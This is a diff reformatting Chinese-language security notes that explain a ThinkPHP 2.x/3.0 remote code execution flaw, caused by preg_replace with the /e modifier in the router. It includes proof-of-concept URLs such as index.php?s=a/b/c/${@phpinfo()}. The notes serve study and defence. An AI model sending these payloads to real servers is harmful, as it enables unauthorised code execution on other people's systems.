@@ -477,11 +477,14 @@ DNSlog探测漏洞是否存在; 内网 不出网，可以在内网搭建ldap。 
 
 # thinkphp漏洞总结
 一、thinkphp 2.x/3.0 远程代码代码执行漏洞
+   
    原因：
 	Dispatcher.class.php中res参数中使用了preg_replace的/e危险参数，使得preg_replace第二个参数就会被当做php代码执行，导致存在一个代码执行漏洞，攻击者可以利用构造的恶意URL执行任意PHP代码。
+   
    分析：
-   	漏洞存在在文件 /ThinkPHP/Lib/Think/Util/Dispatcher.class.php 中，ThinkPHP 2.x版本中使用preg_replace的/e模式匹配路由，我们都知道，preg_replace的/e模式，和php双引号都能导致代码执行的，即漏洞触发点在102行的解析url路径的		preg_replace函数中。代码如下：
-        ```
+   	漏洞存在在文件 /ThinkPHP/Lib/Think/Util/Dispatcher.class.php 中，ThinkPHP 2.x版本中使用preg_replace的/e模式匹配路由，我们都知道，preg_replace的/e模式，和php双引号都能导致代码执行的，即漏洞触发点在102行的解析url路径的preg_replace函数中。代码如下：
+
+```php
         if(!self::routerCheck()){   // 检测路由规则 如果没有则按默认规则调度URL
             $paths = explode($depr,trim($_SERVER['PATH_INFO'],'/'));
             $var  =  array();
@@ -500,71 +503,101 @@ DNSlog探测漏洞是否存在; 内网 不出网，可以在内网搭建ldap。 
             $res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
             $_GET   =  array_merge($var,$_GET);
         }
- 	```
-  	该代码块首先检测路由规则，如果没有制定规则则按照默认规则进行URL调度，在preg_replace()函数中，正则表达式中使用了/e模式，将“替换字符串”作为PHP代码求值，并用其结果来替换所搜索的字符串。
-	正则表达式可以简化为“\w+/([\^\/])”，即搜索获取“/”前后的两个参数，$var[‘\1’]=”\2”;是对数组的操作，将之前搜索到的第一个值作为新数组的键，将第二个值作为新数组的值，我们发现可以构造搜索到的第二个值，即可执行任意PHP代码，在PHP		中，我们可以使用${}里面可以执行函数，然后我们在thinkphp的url中的偶数位置使用${}格式的php代码，即可最终执行thinkphp任意代码执行漏洞，如下所示：
-	
+```
+
+该代码块首先检测路由规则，如果没有制定规则则按照默认规则进行URL调度，在preg_replace()函数中，正则表达式中使用了/e模式，将“替换字符串”作为PHP代码求值，并用其结果来替换所搜索的字符串。
+正则表达式可以简化为“\w+/([\^\/])”，即搜索获取“/”前后的两个参数，$var[‘\1’]=”\2”;是对数组的操作，将之前搜索到的第一个值作为新数组的键，将第二个值作为新数组的值，我们发现可以构造搜索到的第二个值，即可执行任意PHP代码，在PHP中，我们可以使用${}里面可以执行函数，然后我们在thinkphp的url中的偶数位置使用${}格式的php代码，即可最终执行thinkphp任意代码执行漏洞，如下所示：
+
+index.php?s=a/b/c/${code}
+
+index.php?s=a/b/c/${code}/d/e/f
+
+index.php?s=a/b/c/d/e/${code}
+
+由于ThinkPHP存在两种路由规则，如下所示：
+
+1. http://serverName/index.php/模块/控制器/操作/[参数名/参数值...]
+
+   如果不支持PATHINFO的服务器可以使用兼容模式访问如下：
+
+2. http://serverName/index.php?s=/模块/控制器/操作/[参数名/参数值...]
+
+3. 也可采用 index.php/a/b/c/${code}一下形式。
+
+   
+
+示例过程如下：
+假设有这样一个 URL 路径：index.php?s=/blog/read/id/123/type/456
+我们先假设 $depr = '/'，这是路径分隔符。
+执行前的变量状态：
+```
+$paths = ['id', '123', 'type', '456'];
+$paramStr = implode($depr, $paths); // 得到 "id/123/type/456"
+```
+现在来看这句关键代码：
+```
+$res = preg_replace('@(\w+)' . $depr . '([^' . $depr . '/]+)@e', '$var[\'\\1\']="\\2";', $paramStr);
+```
+ 等效于
+
+```
+   $res = preg_replace('@(\w+)/([^/]+)@e', '$var[\'\\1\']="\\2";', 'id/123/type/article');
+```
+
+正则表达式分析：
+
+```
+@(\w+)/([^/]+)@e
+```
+
+这个正则表达式逐对匹配 key/value：
+
+```
+	(\w+)：匹配键（例如 id, type）
+
+    /：匹配中间的分隔符
+
+    ([^/]+)：匹配值（不含 /，例如 123, 456）
+```
+
+匹配结果：
+1.
+
+```
+id/123
+    \1 = id
+
+    \2 = 123
+```
+
+2.
+
+```
+type/456
+
+    \1 = type
+
+    \2 = 456
+```
+
+   替换字符串
+   ```$var[\'\\1\']="\\2";```
+   每次匹配的替换结果是：
+
+```
+$var['id']="123";
+$var['type']="456";
+```
+
+因为php中双引号都能导致代码执行的，所以 index.php?s=a/b/c/${code}  
+相当于$var['c']="${code}";  => index.php?s=a/b/c/${@phpinfo()}   =>  $var['c']="${@phpinfo()} ";  最后phpinfo();会被执行
+
+ POC:
+
 	index.php?s=a/b/c/${code}
 	
 	index.php?s=a/b/c/${code}/d/e/f
-	
+	 
 	index.php?s=a/b/c/d/e/${code}
-	
-	由于ThinkPHP存在两种路由规则，如下所示：
-	
-	1. http://serverName/index.php/模块/控制器/操作/[参数名/参数值...]
-	2. 如果不支持PATHINFO的服务器可以使用兼容模式访问如下：
-	3. http://serverName/index.php?s=/模块/控制器/操作/[参数名/参数值...]
+	 
 	也可采用 index.php/a/b/c/${code}一下形式。
-
- 	示例过程如下：
-  	假设有这样一个 URL 路径：index.php?s=/blog/read/id/123/type/456
- 	我们先假设 $depr = '/'，这是路径分隔符。
-  	执行前的变量状态：
-   	```
-   	$paths = ['id', '123', 'type', '456'];
-	$paramStr = implode($depr, $paths); // 得到 "id/123/type/456"
- 	```
-  	现在来看这句关键代码：
-   	```
-   	$res = preg_replace('@(\w+)' . $depr . '([^' . $depr . '/]+)@e', '$var[\'\\1\']="\\2";', $paramStr);
-    	```
-     	等效于
-      	```
-        $res = preg_replace('@(\w+)/([^/]+)@e', '$var[\'\\1\']="\\2";', 'id/123/type/article');
-        ```
-	正则表达式分析：@(\w+)/([^/]+)@e
-
-	这个正则表达式逐对匹配 key/value：
-	
-    	(\w+)：匹配键（例如 id, type）
-	
-    	/：匹配中间的分隔符
-	
-    	([^/]+)：匹配值（不含 /，例如 123, article）
-     	id/123
-	匹配结果：
-	1.id/123
-	    \1 = id
-	
-	    \2 = 123
-	
-	2.type/article
-	
-	    \1 = type
-	
-	    \2 = article
-       替换字符串
-       ```'$var[\'\\1\']="\\2";'```
-       每次匹配的替换结果是：
-
-    	$var['id']="123";
-    	$var['type']="456";
-        因为php中双引号都能导致代码执行的，所以 index.php?s=a/b/c/${code}  
-	相当于$var['c']="${code}";
-	
-   POC:
-   	index.php?s=a/b/c/${code}
-	index.php?s=a/b/c/${code}/d/e/f
-	index.php?s=a/b/c/d/e/${code}
- 	也可采用 index.php/a/b/c/${code}一下形式。
